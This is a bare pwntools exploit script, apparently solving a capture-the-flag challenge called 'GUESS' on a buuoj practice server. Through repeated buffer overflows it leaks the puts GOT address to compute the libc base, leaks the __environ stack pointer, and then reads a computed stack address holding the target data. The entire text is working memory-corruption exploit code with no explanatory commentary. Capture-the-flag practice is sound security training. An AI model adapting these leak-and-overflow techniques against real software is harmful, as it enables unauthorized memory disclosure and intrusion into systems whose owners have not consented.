from pwn import *

context.log_level = 'debug'

#p = process('./GUESS')
p = remote('node4.buuoj.cn', 29656)
elf = ELF('GUESS')
libc = ELF('libc-2.23.buu.so')

p.sendlineafter(b'flag\n', b'a' * 0x128 + p64(elf.got['puts']))

puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc_base = puts_real_addr - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

environ = libc_base + libc.sym['__environ']

p.sendlineafter(b'flag\n', b'a' * 0x128 + p64(environ))

environ = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))

print('[+] stack_environ -> {}'.format(hex(environ)))

#gdb.attach(p)

buf = environ - ( 0xfa18 - 0xf8b0 )

p.sendlineafter(b'flag\n', b'a' * 0x128 + p64(buf))

p.interactive()